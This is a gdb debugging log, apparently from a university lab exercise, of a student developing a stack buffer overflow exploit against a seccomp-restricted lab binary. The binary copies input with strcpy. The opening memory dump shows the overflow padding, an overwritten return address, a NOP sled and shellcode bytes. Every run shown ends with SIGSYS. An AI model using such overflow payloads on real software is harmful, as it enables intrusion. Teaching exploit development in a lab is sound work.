0x7fffffffe120:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe130:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe140:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe150:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe160:	0x41414141	0x41414141	0xffffe1aa	0x00007fff
0x7fffffffe170:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe180:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe190:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe1d0:	0x90909090	0x793d8d48	0x48011111	0x1116ef81
0x7fffffffe1e0:	0x31480111	0x4802b0c0	0x3148f631	0x48050fd2
0x7fffffffe1f0:	0x3148c389	0x4805b0c0	0x1191c6c7	0x81480111
0x7fffffffe200:	0x111101ee	0xdf894801	0x48f42948	0x050fe689
0x7fffffffe210:	0x24548b48	0xd4294830	0x48df8948	0x3148e689
0x7fffffffe220:	0x48050fc0	0xff48c031	0xff3148c0	0x48c7ff48
(gdb) quit
A debugging session is active.

	Inferior 1 [process 20324] will be killed.

Quit anyway? (y or n) y
ryadav3@nemo:~/576/labs/lab9/vul$ gdb ./sec_prog 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./sec_prog...(no debugging symbols found)...done.
(gdb) disas complex_verify 
Dump of assembler code for function complex_verify:
   0x00000000004008ee <+0>:	push   %rbp
   0x00000000004008ef <+1>:	mov    %rsp,%rbp
   0x00000000004008f2 <+4>:	sub    $0x60,%rsp
   0x00000000004008f6 <+8>:	mov    %rdi,-0x58(%rbp)
   0x00000000004008fa <+12>:	mov    -0x58(%rbp),%rax
   0x00000000004008fe <+16>:	mov    %rax,%rsi
   0x0000000000400901 <+19>:	mov    $0x400afc,%edi
   0x0000000000400906 <+24>:	mov    $0x0,%eax
   0x000000000040090b <+29>:	callq  0x4007a0 <printf@plt>
   0x0000000000400910 <+34>:	mov    -0x58(%rbp),%rdx
   0x0000000000400914 <+38>:	lea    -0x50(%rbp),%rax
   0x0000000000400918 <+42>:	mov    %rdx,%rsi
   0x000000000040091b <+45>:	mov    %rax,%rdi
   0x000000000040091e <+48>:	callq  0x400750 <strcpy@plt>
   0x0000000000400923 <+53>:	movl   $0x0,-0x4(%rbp)
   0x000000000040092a <+60>:	jmp    0x400948 <complex_verify+90>
   0x000000000040092c <+62>:	mov    -0x4(%rbp),%eax
   0x000000000040092f <+65>:	cltq   
   0x0000000000400931 <+67>:	movzbl -0x50(%rbp,%rax,1),%eax
   0x0000000000400936 <+72>:	add    $0x1,%eax
   0x0000000000400939 <+75>:	mov    %eax,%edx
   0x000000000040093b <+77>:	mov    -0x4(%rbp),%eax
   0x000000000040093e <+80>:	cltq   
   0x0000000000400940 <+82>:	mov    %dl,-0x50(%rbp,%rax,1)
   0x0000000000400944 <+86>:	addl   $0x1,-0x4(%rbp)
   0x0000000000400948 <+90>:	mov    -0x4(%rbp),%eax
   0x000000000040094b <+93>:	cmp    $0x3e,%eax
   0x000000000040094e <+96>:	jbe    0x40092c <complex_verify+62>
   0x0000000000400950 <+98>:	mov    -0x4(%rbp),%eax
   0x0000000000400953 <+101>:	sub    $0x3e,%eax
   0x0000000000400956 <+104>:	leaveq 
   0x0000000000400957 <+105>:	retq   
End of assembler dump.
(gdb) b *0x0000000000400923
Breakpoint 1 at 0x400923
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/sec_prog < payload

Program terminated with signal SIGSYS, Bad system call.
The program no longer exists.
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004009bb <+0>:	push   %rbp
   0x00000000004009bc <+1>:	mov    %rsp,%rbp
   0x00000000004009bf <+4>:	sub    $0x20,%rsp
   0x00000000004009c3 <+8>:	mov    %edi,-0x14(%rbp)
   0x00000000004009c6 <+11>:	mov    %rsi,-0x20(%rbp)
   0x00000000004009ca <+15>:	mov    $0x0,%edi
   0x00000000004009cf <+20>:	callq  0x400740 <seccomp_init@plt>
   0x00000000004009d4 <+25>:	mov    %rax,-0x8(%rbp)
   0x00000000004009d8 <+29>:	mov    -0x8(%rbp),%rax
   0x00000000004009dc <+33>:	mov    $0x0,%ecx
   0x00000000004009e1 <+38>:	mov    $0x3c,%edx
   0x00000000004009e6 <+43>:	mov    $0x7fff0000,%esi
   0x00000000004009eb <+48>:	mov    %rax,%rdi
   0x00000000004009ee <+51>:	mov    $0x0,%eax
   0x00000000004009f3 <+56>:	callq  0x400760 <seccomp_rule_add@plt>
   0x00000000004009f8 <+61>:	mov    -0x8(%rbp),%rax
   0x00000000004009fc <+65>:	mov    $0x0,%ecx
   0x0000000000400a01 <+70>:	mov    $0x0,%edx
   0x0000000000400a06 <+75>:	mov    $0x7fff0000,%esi
   0x0000000000400a0b <+80>:	mov    %rax,%rdi
   0x0000000000400a0e <+83>:	mov    $0x0,%eax
   0x0000000000400a13 <+88>:	callq  0x400760 <seccomp_rule_add@plt>
   0x0000000000400a18 <+93>:	mov    -0x8(%rbp),%rax
   0x0000000000400a1c <+97>:	mov    $0x0,%ecx
   0x0000000000400a21 <+102>:	mov    $0x1,%edx
   0x0000000000400a26 <+107>:	mov    $0x7fff0000,%esi
   0x0000000000400a2b <+112>:	mov    %rax,%rdi
   0x0000000000400a2e <+115>:	mov    $0x0,%eax
   0x0000000000400a33 <+120>:	callq  0x400760 <seccomp_rule_add@plt>
   0x0000000000400a38 <+125>:	mov    -0x8(%rbp),%rax
   0x0000000000400a3c <+129>:	mov    %rax,%rdi
   0x0000000000400a3f <+132>:	callq  0x400790 <seccomp_load@plt>
   0x0000000000400a44 <+137>:	mov    $0x0,%eax
   0x0000000000400a49 <+142>:	callq  0x400958 <read_input>
   0x0000000000400a4e <+147>:	mov    $0x0,%eax
   0x0000000000400a53 <+152>:	leaveq 
   0x0000000000400a54 <+153>:	retq   
End of assembler dump.
(gdb) b read_input
Breakpoint 2 at 0x40095c
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/sec_prog < payload

Breakpoint 2, 0x000000000040095c in read_input ()
(gdb) disas read_input 
Dump of assembler code for function read_input:
   0x0000000000400958 <+0>:	push   %rbp
   0x0000000000400959 <+1>:	mov    %rsp,%rbp
=> 0x000000000040095c <+4>:	sub    $0x200,%rsp
   0x0000000000400963 <+11>:	mov    $0x400b0b,%edi
   0x0000000000400968 <+16>:	callq  0x400770 <puts@plt>
   0x000000000040096d <+21>:	mov    0x2006fc(%rip),%rdx        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x0000000000400974 <+28>:	lea    -0x200(%rbp),%rax
   0x000000000040097b <+35>:	mov    %rdx,%rcx
   0x000000000040097e <+38>:	mov    $0x200,%edx
   0x0000000000400983 <+43>:	mov    $0x1,%esi
   0x0000000000400988 <+48>:	mov    %rax,%rdi
   0x000000000040098b <+51>:	callq  0x400780 <fread@plt>
   0x0000000000400990 <+56>:	lea    -0x200(%rbp),%rax
   0x0000000000400997 <+63>:	mov    %rax,%rdi
   0x000000000040099a <+66>:	callq  0x4008ee <complex_verify>
   0x000000000040099f <+71>:	test   %eax,%eax
   0x00000000004009a1 <+73>:	js     0x4009af <read_input+87>
   0x00000000004009a3 <+75>:	mov    $0x400b26,%edi
   0x00000000004009a8 <+80>:	callq  0x400770 <puts@plt>
   0x00000000004009ad <+85>:	jmp    0x4009b9 <read_input+97>
   0x00000000004009af <+87>:	mov    $0x0,%eax
   0x00000000004009b4 <+92>:	callq  0x4008d6 <party>
   0x00000000004009b9 <+97>:	leaveq 
   0x00000000004009ba <+98>:	retq   
End of assembler dump.
(gdb)  b complex_verify 
Breakpoint 3 at 0x4008f2
(gdb) c
Continuing.

Program terminated with signal SIGSYS, Bad system call.
The program no longer exists.
(gdb) bt
No stack.
(gdb) i r rip
The program has no registers now.
(gdb) b *0x000000000040096d
Breakpoint 4 at 0x40096d
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/sec_prog < payload

Breakpoint 2, 0x000000000040095c in read_input ()
(gdb) c
Continuing.

Program terminated with signal SIGSYS, Bad system call.
The program no longer exists.
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/sec_prog < payload

Breakpoint 2, 0x000000000040095c in read_input ()
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/3i $rip
>end
(gdb) ni
=> 0x400963 <read_input+11>:	mov    $0x400b0b,%edi
   0x400968 <read_input+16>:	callq  0x400770 <puts@plt>
   0x40096d <read_input+21>:	mov    0x2006fc(%rip),%rdx        # 0x601070 <stdin@@GLIBC_2.2.5>
0x0000000000400963 in read_input ()
(gdb) 
=> 0x400968 <read_input+16>:	callq  0x400770 <puts@plt>
   0x40096d <read_input+21>:	mov    0x2006fc(%rip),%rdx        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x400974 <read_input+28>:	lea    -0x200(%rbp),%rax
0x0000000000400968 in read_input ()
(gdb) 

Program terminated with signal SIGSYS, Bad system call.
The program no longer exists.
Error while running hook_stop:
No registers.
(gdb) r < payload
Starting program: /home/ryadav3/576/labs/lab9/vul/sec_prog < payload
=> 0x40095c <read_input+4>:	sub    $0x200,%rsp
   0x400963 <read_input+11>:	mov    $0x400b0b,%edi
   0x400968 <read_input+16>:	callq  0x400770 <puts@plt>

Breakpoint 2, 0x000000000040095c in read_input ()
(gdb) si
=> 0x400963 <read_input+11>:	mov    $0x400b0b,%edi
   0x400968 <read_input+16>:	callq  0x400770 <puts@plt>
   0x40096d <read_input+21>:	mov    0x2006fc(%rip),%rdx        # 0x601070 <stdin@@GLIBC_2.2.5>
0x0000000000400963 in read_input ()
(gdb) 
=> 0x400968 <read_input+16>:	callq  0x400770 <puts@plt>
   0x40096d <read_input+21>:	mov    0x2006fc(%rip),%rdx        # 0x601070 <stdin@@GLIBC_2.2.5>
   0x400974 <read_input+28>:	lea    -0x200(%rbp),%rax
0x0000000000400968 in read_input ()
(gdb) 
=> 0x400770 <puts@plt>:	jmpq   *0x2008ba(%rip)        # 0x601030
   0x400776 <puts@plt+6>:	pushq  $0x3
   0x40077b <puts@plt+11>:	jmpq   0x400730
0x0000000000400770 in puts@plt ()
(gdb) 
=> 0x400776 <puts@plt+6>:	pushq  $0x3
   0x40077b <puts@plt+11>:	jmpq   0x400730
   0x400780 <fread@plt>:	jmpq   *0x2008b2(%rip)        # 0x601038
0x0000000000400776 in puts@plt ()
(gdb) 
=> 0x40077b <puts@plt+11>:	jmpq   0x400730
   0x400780 <fread@plt>:	jmpq   *0x2008b2(%rip)        # 0x601038
   0x400786 <fread@plt+6>:	pushq  $0x4
0x000000000040077b in puts@plt ()
(gdb) 
=> 0x400730:	pushq  0x2008d2(%rip)        # 0x601008
   0x400736:	jmpq   *0x2008d4(%rip)        # 0x601010
   0x40073c:	nopl   0x0(%rax)
0x0000000000400730 in ?? ()
(gdb) 
=> 0x400736:	jmpq   *0x2008d4(%rip)        # 0x601010
   0x40073c:	nopl   0x0(%rax)
   0x400740 <seccomp_init@plt>:	jmpq   *0x2008d2(%rip)        # 0x601018
0x0000000000400736 in ?? ()
(gdb) 
=> 0x7ffff7dee870 <_dl_runtime_resolve_avx>:	push   %rbx
   0x7ffff7dee871 <_dl_runtime_resolve_avx+1>:	mov    %rsp,%rbx
   0x7ffff7dee874 <_dl_runtime_resolve_avx+4>:	and    $0xffffffffffffffe0,%rsp
_dl_runtime_resolve_avx () at ../sysdeps/x86_64/dl-trampoline.h:64
64	../sysdeps/x86_64/dl-trampoline.h: No such file or directory.
(gdb) 
=> 0x7ffff7dee871 <_dl_runtime_resolve_avx+1>:	mov    %rsp,%rbx
   0x7ffff7dee874 <_dl_runtime_resolve_avx+4>:	and    $0xffffffffffffffe0,%rsp
   0x7ffff7dee878 <_dl_runtime_resolve_avx+8>:	sub    $0x180,%rsp
67	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee874 <_dl_runtime_resolve_avx+4>:	and    $0xffffffffffffffe0,%rsp
   0x7ffff7dee878 <_dl_runtime_resolve_avx+8>:	sub    $0x180,%rsp
   0x7ffff7dee87f <_dl_runtime_resolve_avx+15>:	mov    %rax,0x140(%rsp)
69	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee878 <_dl_runtime_resolve_avx+8>:	sub    $0x180,%rsp
   0x7ffff7dee87f <_dl_runtime_resolve_avx+15>:	mov    %rax,0x140(%rsp)
   0x7ffff7dee887 <_dl_runtime_resolve_avx+23>:	mov    %rcx,0x148(%rsp)
71	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee87f <_dl_runtime_resolve_avx+15>:	mov    %rax,0x140(%rsp)
   0x7ffff7dee887 <_dl_runtime_resolve_avx+23>:	mov    %rcx,0x148(%rsp)
   0x7ffff7dee88f <_dl_runtime_resolve_avx+31>:	mov    %rdx,0x150(%rsp)
_dl_runtime_resolve_avx () at ../sysdeps/x86_64/dl-trampoline.h:74
74	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee887 <_dl_runtime_resolve_avx+23>:	mov    %rcx,0x148(%rsp)
   0x7ffff7dee88f <_dl_runtime_resolve_avx+31>:	mov    %rdx,0x150(%rsp)
   0x7ffff7dee897 <_dl_runtime_resolve_avx+39>:	mov    %rsi,0x158(%rsp)
75	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee88f <_dl_runtime_resolve_avx+31>:	mov    %rdx,0x150(%rsp)
   0x7ffff7dee897 <_dl_runtime_resolve_avx+39>:	mov    %rsi,0x158(%rsp)
   0x7ffff7dee89f <_dl_runtime_resolve_avx+47>:	mov    %rdi,0x160(%rsp)
76	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee897 <_dl_runtime_resolve_avx+39>:	mov    %rsi,0x158(%rsp)
   0x7ffff7dee89f <_dl_runtime_resolve_avx+47>:	mov    %rdi,0x160(%rsp)
   0x7ffff7dee8a7 <_dl_runtime_resolve_avx+55>:	mov    %r8,0x168(%rsp)
77	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee89f <_dl_runtime_resolve_avx+47>:	mov    %rdi,0x160(%rsp)
   0x7ffff7dee8a7 <_dl_runtime_resolve_avx+55>:	mov    %r8,0x168(%rsp)
   0x7ffff7dee8af <_dl_runtime_resolve_avx+63>:	mov    %r9,0x170(%rsp)
78	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8a7 <_dl_runtime_resolve_avx+55>:	mov    %r8,0x168(%rsp)
   0x7ffff7dee8af <_dl_runtime_resolve_avx+63>:	mov    %r9,0x170(%rsp)
   0x7ffff7dee8b7 <_dl_runtime_resolve_avx+71>:	vmovdqa %ymm0,(%rsp)
79	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8af <_dl_runtime_resolve_avx+63>:	mov    %r9,0x170(%rsp)
   0x7ffff7dee8b7 <_dl_runtime_resolve_avx+71>:	vmovdqa %ymm0,(%rsp)
   0x7ffff7dee8bc <_dl_runtime_resolve_avx+76>:	vmovdqa %ymm1,0x20(%rsp)
80	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8b7 <_dl_runtime_resolve_avx+71>:	vmovdqa %ymm0,(%rsp)
   0x7ffff7dee8bc <_dl_runtime_resolve_avx+76>:	vmovdqa %ymm1,0x20(%rsp)
   0x7ffff7dee8c2 <_dl_runtime_resolve_avx+82>:	vmovdqa %ymm2,0x40(%rsp)
81	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8bc <_dl_runtime_resolve_avx+76>:	vmovdqa %ymm1,0x20(%rsp)
   0x7ffff7dee8c2 <_dl_runtime_resolve_avx+82>:	vmovdqa %ymm2,0x40(%rsp)
   0x7ffff7dee8c8 <_dl_runtime_resolve_avx+88>:	vmovdqa %ymm3,0x60(%rsp)
82	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8c2 <_dl_runtime_resolve_avx+82>:	vmovdqa %ymm2,0x40(%rsp)
   0x7ffff7dee8c8 <_dl_runtime_resolve_avx+88>:	vmovdqa %ymm3,0x60(%rsp)
   0x7ffff7dee8ce <_dl_runtime_resolve_avx+94>:	vmovdqa %ymm4,0x80(%rsp)
83	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8c8 <_dl_runtime_resolve_avx+88>:	vmovdqa %ymm3,0x60(%rsp)
   0x7ffff7dee8ce <_dl_runtime_resolve_avx+94>:	vmovdqa %ymm4,0x80(%rsp)
   0x7ffff7dee8d7 <_dl_runtime_resolve_avx+103>:	vmovdqa %ymm5,0xa0(%rsp)
84	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8ce <_dl_runtime_resolve_avx+94>:	vmovdqa %ymm4,0x80(%rsp)
   0x7ffff7dee8d7 <_dl_runtime_resolve_avx+103>:	vmovdqa %ymm5,0xa0(%rsp)
   0x7ffff7dee8e0 <_dl_runtime_resolve_avx+112>:	vmovdqa %ymm6,0xc0(%rsp)
85	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8d7 <_dl_runtime_resolve_avx+103>:	vmovdqa %ymm5,0xa0(%rsp)
   0x7ffff7dee8e0 <_dl_runtime_resolve_avx+112>:	vmovdqa %ymm6,0xc0(%rsp)
   0x7ffff7dee8e9 <_dl_runtime_resolve_avx+121>:	vmovdqa %ymm7,0xe0(%rsp)
86	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8e0 <_dl_runtime_resolve_avx+112>:	vmovdqa %ymm6,0xc0(%rsp)
   0x7ffff7dee8e9 <_dl_runtime_resolve_avx+121>:	vmovdqa %ymm7,0xe0(%rsp)
   0x7ffff7dee8f2 <_dl_runtime_resolve_avx+130>:	bndmov %bnd0,0x100(%rsp)
87	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8e9 <_dl_runtime_resolve_avx+121>:	vmovdqa %ymm7,0xe0(%rsp)
   0x7ffff7dee8f2 <_dl_runtime_resolve_avx+130>:	bndmov %bnd0,0x100(%rsp)
   0x7ffff7dee8fb <_dl_runtime_resolve_avx+139>:	bndmov %bnd1,0x110(%rsp)
88	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8f2 <_dl_runtime_resolve_avx+130>:	bndmov %bnd0,0x100(%rsp)
   0x7ffff7dee8fb <_dl_runtime_resolve_avx+139>:	bndmov %bnd1,0x110(%rsp)
   0x7ffff7dee904 <_dl_runtime_resolve_avx+148>:	bndmov %bnd2,0x120(%rsp)
93	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee8fb <_dl_runtime_resolve_avx+139>:	bndmov %bnd1,0x110(%rsp)
   0x7ffff7dee904 <_dl_runtime_resolve_avx+148>:	bndmov %bnd2,0x120(%rsp)
   0x7ffff7dee90d <_dl_runtime_resolve_avx+157>:	bndmov %bnd3,0x130(%rsp)
94	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee904 <_dl_runtime_resolve_avx+148>:	bndmov %bnd2,0x120(%rsp)
   0x7ffff7dee90d <_dl_runtime_resolve_avx+157>:	bndmov %bnd3,0x130(%rsp)
   0x7ffff7dee916 <_dl_runtime_resolve_avx+166>:	mov    0x10(%rbx),%rsi
95	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee90d <_dl_runtime_resolve_avx+157>:	bndmov %bnd3,0x130(%rsp)
   0x7ffff7dee916 <_dl_runtime_resolve_avx+166>:	mov    0x10(%rbx),%rsi
   0x7ffff7dee91a <_dl_runtime_resolve_avx+170>:	mov    0x8(%rbx),%rdi
96	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee916 <_dl_runtime_resolve_avx+166>:	mov    0x10(%rbx),%rsi
   0x7ffff7dee91a <_dl_runtime_resolve_avx+170>:	mov    0x8(%rbx),%rdi
   0x7ffff7dee91e <_dl_runtime_resolve_avx+174>:	callq  0x7ffff7de69f0 <_dl_fixup>
110	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee91a <_dl_runtime_resolve_avx+170>:	mov    0x8(%rbx),%rdi
   0x7ffff7dee91e <_dl_runtime_resolve_avx+174>:	callq  0x7ffff7de69f0 <_dl_fixup>
   0x7ffff7dee923 <_dl_runtime_resolve_avx+179>:	mov    %rax,%r11
111	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7dee91e <_dl_runtime_resolve_avx+174>:	callq  0x7ffff7de69f0 <_dl_fixup>
   0x7ffff7dee923 <_dl_runtime_resolve_avx+179>:	mov    %rax,%r11
   0x7ffff7dee926 <_dl_runtime_resolve_avx+182>:	bndmov 0x130(%rsp),%bnd3
112	in ../sysdeps/x86_64/dl-trampoline.h
(gdb) 
=> 0x7ffff7de69f0 <_dl_fixup>:	push   %rbx
   0x7ffff7de69f1 <_dl_fixup+1>:	mov    %rdi,%r10
   0x7ffff7de69f4 <_dl_fixup+4>:	mov    %esi,%esi
_dl_fixup (l=0x7ffff7ffe168, reloc_arg=3) at ../elf/dl-runtime.c:66
66	../elf/dl-runtime.c: No such file or directory.
(gdb) 
=> 0x7ffff7de69f1 <_dl_fixup+1>:	mov    %rdi,%r10
   0x7ffff7de69f4 <_dl_fixup+4>:	mov    %esi,%esi
   0x7ffff7de69f6 <_dl_fixup+6>:	lea    (%rsi,%rsi,2),%rdx
0x00007ffff7de69f1	66	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de69f4 <_dl_fixup+4>:	mov    %esi,%esi
   0x7ffff7de69f6 <_dl_fixup+6>:	lea    (%rsi,%rsi,2),%rdx
   0x7ffff7de69fa <_dl_fixup+10>:	sub    $0x10,%rsp
71	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de69f6 <_dl_fixup+6>:	lea    (%rsi,%rsi,2),%rdx
   0x7ffff7de69fa <_dl_fixup+10>:	sub    $0x10,%rsp
   0x7ffff7de69fe <_dl_fixup+14>:	mov    0x68(%rdi),%rax
0x00007ffff7de69f6	71	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de69fa <_dl_fixup+10>:	sub    $0x10,%rsp
   0x7ffff7de69fe <_dl_fixup+14>:	mov    0x68(%rdi),%rax
   0x7ffff7de6a02 <_dl_fixup+18>:	mov    0x8(%rax),%rdi
66	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de69fe <_dl_fixup+14>:	mov    0x68(%rdi),%rax
   0x7ffff7de6a02 <_dl_fixup+18>:	mov    0x8(%rax),%rdi
   0x7ffff7de6a06 <_dl_fixup+22>:	mov    0xf8(%r10),%rax
69	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a02 <_dl_fixup+18>:	mov    0x8(%rax),%rdi
   0x7ffff7de6a06 <_dl_fixup+22>:	mov    0xf8(%r10),%rax
   0x7ffff7de6a0d <_dl_fixup+29>:	mov    0x8(%rax),%rax
0x00007ffff7de6a02	69	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a06 <_dl_fixup+22>:	mov    0xf8(%r10),%rax
   0x7ffff7de6a0d <_dl_fixup+29>:	mov    0x8(%rax),%rax
   0x7ffff7de6a11 <_dl_fixup+33>:	lea    (%rax,%rdx,8),%r8
72	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a0d <_dl_fixup+29>:	mov    0x8(%rax),%rax
   0x7ffff7de6a11 <_dl_fixup+33>:	lea    (%rax,%rdx,8),%r8
   0x7ffff7de6a15 <_dl_fixup+37>:	mov    0x70(%r10),%rax
71	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a11 <_dl_fixup+33>:	lea    (%rax,%rdx,8),%r8
   0x7ffff7de6a15 <_dl_fixup+37>:	mov    0x70(%r10),%rax
   0x7ffff7de6a19 <_dl_fixup+41>:	mov    0x8(%r8),%rcx
0x00007ffff7de6a11	71	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a15 <_dl_fixup+37>:	mov    0x70(%r10),%rax
   0x7ffff7de6a19 <_dl_fixup+41>:	mov    0x8(%r8),%rcx
   0x7ffff7de6a1d <_dl_fixup+45>:	mov    0x8(%rax),%rax
68	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a19 <_dl_fixup+41>:	mov    0x8(%r8),%rcx
   0x7ffff7de6a1d <_dl_fixup+45>:	mov    0x8(%rax),%rax
   0x7ffff7de6a21 <_dl_fixup+49>:	mov    %rcx,%rdx
73	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a1d <_dl_fixup+45>:	mov    0x8(%rax),%rax
   0x7ffff7de6a21 <_dl_fixup+49>:	mov    %rcx,%rdx
   0x7ffff7de6a24 <_dl_fixup+52>:	shr    $0x20,%rdx
0x00007ffff7de6a1d	73	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a21 <_dl_fixup+49>:	mov    %rcx,%rdx
   0x7ffff7de6a24 <_dl_fixup+52>:	shr    $0x20,%rdx
   0x7ffff7de6a28 <_dl_fixup+56>:	lea    (%rdx,%rdx,2),%rsi
0x00007ffff7de6a21	73	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a24 <_dl_fixup+52>:	shr    $0x20,%rdx
   0x7ffff7de6a28 <_dl_fixup+56>:	lea    (%rdx,%rdx,2),%rsi
   0x7ffff7de6a2c <_dl_fixup+60>:	lea    (%rax,%rsi,8),%rsi
0x00007ffff7de6a24	73	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a28 <_dl_fixup+56>:	lea    (%rdx,%rdx,2),%rsi
   0x7ffff7de6a2c <_dl_fixup+60>:	lea    (%rax,%rsi,8),%rsi
   0x7ffff7de6a30 <_dl_fixup+64>:	mov    (%r10),%rax
0x00007ffff7de6a28	73	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a2c <_dl_fixup+60>:	lea    (%rax,%rsi,8),%rsi
   0x7ffff7de6a30 <_dl_fixup+64>:	mov    (%r10),%rax
   0x7ffff7de6a33 <_dl_fixup+67>:	mov    %rsi,0x8(%rsp)
0x00007ffff7de6a2c	73	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a30 <_dl_fixup+64>:	mov    (%r10),%rax
   0x7ffff7de6a33 <_dl_fixup+67>:	mov    %rsi,0x8(%rsp)
   0x7ffff7de6a38 <_dl_fixup+72>:	mov    %rax,%rbx
74	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a33 <_dl_fixup+67>:	mov    %rsi,0x8(%rsp)
   0x7ffff7de6a38 <_dl_fixup+72>:	mov    %rax,%rbx
   0x7ffff7de6a3b <_dl_fixup+75>:	add    (%r8),%rbx
73	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a38 <_dl_fixup+72>:	mov    %rax,%rbx
   0x7ffff7de6a3b <_dl_fixup+75>:	add    (%r8),%rbx
   0x7ffff7de6a3e <_dl_fixup+78>:	cmp    $0x7,%ecx
74	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a3b <_dl_fixup+75>:	add    (%r8),%rbx
   0x7ffff7de6a3e <_dl_fixup+78>:	cmp    $0x7,%ecx
   0x7ffff7de6a41 <_dl_fixup+81>:	jne    0x7ffff7de6b97 <_dl_fixup+423>
0x00007ffff7de6a3b	74	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a3e <_dl_fixup+78>:	cmp    $0x7,%ecx
   0x7ffff7de6a41 <_dl_fixup+81>:	jne    0x7ffff7de6b97 <_dl_fixup+423>
   0x7ffff7de6a47 <_dl_fixup+87>:	testb  $0x3,0x5(%rsi)
79	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a41 <_dl_fixup+81>:	jne    0x7ffff7de6b97 <_dl_fixup+423>
   0x7ffff7de6a47 <_dl_fixup+87>:	testb  $0x3,0x5(%rsi)
   0x7ffff7de6a4b <_dl_fixup+91>:	jne    0x7ffff7de6ae9 <_dl_fixup+249>
0x00007ffff7de6a41	79	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a47 <_dl_fixup+87>:	testb  $0x3,0x5(%rsi)
   0x7ffff7de6a4b <_dl_fixup+91>:	jne    0x7ffff7de6ae9 <_dl_fixup+249>
   0x7ffff7de6a51 <_dl_fixup+97>:	mov    0x1c8(%r10),%rax
83	in ../elf/dl-runtime.c
(gdb) 
=> 0x7ffff7de6a4b <_dl_fixup+91>:	jne    0x7ffff7de6ae9 <_dl_fixup+249>
   0x7ffff7de6a51 <_dl_fixup+97>:	mov    0x1c8(%r10),%rax
